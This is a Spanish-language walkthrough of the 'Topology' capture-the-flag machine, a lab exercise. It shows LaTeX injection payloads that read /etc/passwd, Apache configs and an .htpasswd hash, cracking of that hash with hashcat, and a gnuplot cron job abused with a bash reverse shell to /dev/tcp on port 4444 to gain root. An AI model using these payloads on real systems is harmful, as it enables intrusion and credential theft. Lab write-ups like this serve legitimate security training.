---
title: "Topology"
date: "2025-02-21T17:00:00-05:00"
type: "maquinas"
draft: false
tags: ["crontabs", "linux", "latex", "sudo", "subdominio", "file-read", "apache2", "pspy64", "gnuplot"]
---

Una maquina en la que tenemos que hacer una inyeccion latex para poder leer archivos y asi conseguir el hash del usuario para luego mediante una tarea recurrente ganar root
Dificultad: Facil

# Enumeración

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allPorts
```

- `-p-` Escanea todos los puertos `1-65535` .
- `—open` Solo muestra los puertos que esten abiertos.
- `-sS` Stealt scan cambia el modo de escane haciendo que no se complete el hanshake.
- `—min-rate 5000` Como minimo va a enviar 5000 paquetes por segundo.
- `-vvv` Aumenta la verbosidad mostrando la maxima informacion posible mientras se ejecuta.
- `-n` Desactiva la resolucion `DNS` no va a tratar de resolver los nombres de dominio.
- `-Pn` Nmap por default manda un ping a la ip esto lo desactiva.
- `-oG allPorts` Guarda el escaneo en formato `oG` en el archivo llamado `allPorts`.

Este escaneo nos dio dos puertos el 22 y el 80 vamos a hacer un escaneo mas exhaustivo a estos puertos.

```bash
sudo nmap -sCV -p22,80 IP -A -oN target
```

- `-sCV` Esto ejecuta una serie de scripts predeterminados de nmap para obtener información adicional sobre los servicios que se encuentran abiertos, como versiones de servicios, detalles del sistema operativo, vulnerabilidades conocidas y la version exacta.
- `-p22, 80` Especifica que puertos se van a escanear.
- `-A` Activa el descubrimiento de sistema operativo, la deteccion de version, script scanning y hace un traceroute.

<a href="https://imgur.com/u8zXpKh"><img src="https://i.imgur.com/u8zXpKh.png" title="source: imgur.com" /></a>

La pagina http que esta en el puerto 80 usa Apache 2.4.41

## Puerto 80

<a href="https://imgur.com/P2kGwLQ"><img src="https://i.imgur.com/P2kGwLQ.png" title="source: imgur.com" /></a>

Al momento de entrar a el link `“Latex Equation Generator”` es un subdmonio por lo que tendremos que agregarlo al `/etc/hosts` para que nos muestre lo siguiente.

<a href="https://imgur.com/T7QA4dq"><img src="https://i.imgur.com/T7QA4dq.png" title="source: imgur.com" /></a>

Algo que podemos tratar es listar los archivos dentro de este subdmonio por lo que vamos a ingresar a la siguiente url [`http://latex.topology.htb/`](http://latex.topology.htb/equation.php) dejando el ultimo `/` .

<a href="https://imgur.com/aTp681K"><img src="https://i.imgur.com/aTp681K.png" title="source: imgur.com" /></a>

Revisando los archivos lo unico util esta en `equationtest.tex` ya que nos muestra como estan tratando la entrada Latex la web.

```latex
\documentclass{standalone}
\input{header}
\begin{document}

$ \int_{a}^b\int_{c}^d f(x,y)dxdy $

\end{document}
```

Podemos observar que la entrada esta entre los signos dolar, leyendo la pagina nos dicen que latex esta en el modo “[inline math](https://www.physicsread.com/latex-math-mode/)” buscando acerca de este modo nos encontramos que hay tres formas de tratar este modo:

1. $ . . .$
2. \begin{math} . . . \end{math}
3. \( . . . \)

# Foothold

Por lo que ahora sabemos porque esta entre esos signos y confirmamos que la entrada va a estar así planeando una inyección.

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection)

Vamos a tratar de empezar a leer archivos del sistema con la inyección de codigo.

```latex
$ \lstinputlisting{/etc/passwd} $
```

<a href="https://imgur.com/eFdUTzY"><img src="https://i.imgur.com/eFdUTzY.png" title="source: imgur.com" /></a>

Una vez confirmamos que podemso leer archivos vamos a empezar a leer archivos de configuracion que nos permitan ingresar al sistema.

```latex
$ \lstinputlisting{/etc/apache2/sites-enabled/000-default.conf} $
```

En este archivo encontramos varios directorios entre ellos uno que pertence al subdominio `dev.topology.htb` lo agregamos al `/etc/hosts` y al ingresar nos pide una contraseña.

Vamos a listar archivos de configuracion por default de apache sobre el directorio correspondiente a este subdominio.

```latex
$ \lstinputlisting{/var/www/dev/.htaccess} $
```

<a href="https://imgur.com/pH0zQXZ"><img src="https://i.imgur.com/pH0zQXZ.png" title="source: imgur.com" /></a>

Por ultimo vamos a listar este archivo.

```latex
$ \lstinputlisting{/var/www/dev/.htpasswd} $
```

Nos vamos a encontrar un usuario junto con su hash, vamos a copiarlo y guardarlo en un archivo `.txt` para hacerle fuerza bruta con `hashcat`:

```python
hashcat hash.txt --wordlist /usr/share/wordlist/rockyou.txt --user
```

Esto nos dara su contraseña para iniciar sesion mediante ssh.

# Root

## Enumeración

Primero vamos a hacer el tratamiento de la shell 

```bash
export TERM=xterm
```

Listo ahora vamos a tratar de listar archivos y permisos a ver si encontramos algo, pero nos daremos cuenta rapidamente que no tenemos permitido el uso de sudo ni ningun permiso extraño por lo que lo unico que tiene algo interesante son las crontab pero no nos permite listarlas por lo que vamos a usar la herramienta [Pspy](https://github.com/DominicBreuker/pspy/tree/master).

```bash
#Maquina atacante 
python3 -m http.server 80

#Maquina victima
wget IP/pspy64
chmod +x pspy64 
./pspy64
```

Luego de ejecutar el ultimo comando si esperamos un rato podremos ver que hay una script que se ejecuta cada minuto `/opt/gnuplot/getdata.sh` .

<a href="https://imgur.com/9ry28PV"><img src="https://i.imgur.com/9ry28PV.png" title="source: imgur.com" /></a>

Si analizamos esta salida nos daremos cuenta que lo que se esta haciendo cada minuto es buscar en el directorio `/opt/gnuplot/` todos los archivos con extension `plt` y los ejecuta.

Si tratamos de ingresar al directorio no nos lo permite pero en cambio si creamos un archivo y lo movemos a esa direccion no habra ningun conflicto. Buscando escalaciones de privilegios con `gnuplot` que es el binario que se ejecuta encontramos la siguiente [Exploit](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/gnuplot-privilege-escalation).

```bash
#Maquina atacante
nc -lvnp 4444

#Maquina victima
nano rev.plt

system "bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'"

mv rev.plt /opt/gnuplot/
```

Con esto tendremos acceso como root y habremos completado la maquina.
